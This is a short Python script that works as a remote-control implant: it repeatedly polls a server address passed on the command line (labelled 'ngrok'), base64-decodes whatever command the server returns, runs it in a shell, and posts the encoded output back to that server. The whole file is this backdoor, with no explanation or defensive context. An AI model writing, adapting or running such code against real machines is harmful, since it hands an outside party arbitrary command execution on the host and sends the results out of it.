import requests, sys, subprocess, base64, time
ngrok = sys.argv[1]
while 1:
	request = requests.get(ngrok)
	if request.status_code == 200:
		output = subprocess.Popen(base64.b64decode(request.text), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		requests.post(ngrok, data={'SPLITHERE': base64.b64encode(output.stdout.read()+output.stderr.read())})
	elif request.status_code == 502:
		time.sleep(5)
	else:
		sys.exit()
